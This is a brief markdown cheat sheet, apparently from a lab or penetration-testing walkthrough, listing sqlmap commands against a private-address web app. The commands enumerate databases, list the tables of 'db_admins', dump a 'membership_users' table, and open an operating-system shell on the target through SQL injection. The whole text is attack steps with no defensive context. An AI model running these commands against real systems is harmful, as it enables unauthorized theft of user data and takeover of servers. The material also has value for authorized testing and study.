---

---

---
## Without Network Package

```
sqlmap -u http://172.16.1.12/blog/category.php?id=1 --dbs --batch
```

## Saving Network Package

Enumerating Databases

```
sqlmap -r sql.req --batch -dbs
```

Enumerated Tables

```
sqlmap -r sql.req --batch -D db_admins --tables
```

Dumped Table

```
sqlmap -r sql.req --batch -D db_admins -T membership_users --dump
```

RCE

```
sqlmap -r sql.req --os-shell --batch
```